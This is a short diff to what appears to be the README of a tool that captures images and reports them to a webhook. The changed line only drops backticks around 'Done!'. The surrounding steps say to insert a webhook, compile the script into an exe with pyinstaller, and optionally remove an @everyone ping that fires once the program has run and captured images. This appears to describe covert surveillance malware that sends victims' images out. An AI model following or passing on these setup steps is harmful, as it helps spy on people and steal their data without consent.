@@ -16,4 +16,4 @@ code ✅
 | put your webhook in on line 5	|
 | then run exe.bat if you want to convert it to an exe (need pyinstaller to create exe `pip install pyinstaller`) 				|
 | additionally remove the @everyone on line 52 if you don't want it to ping when the program has been executed and succesfully captured images 				|
-| `Done!` 				|
+| Done! 				|
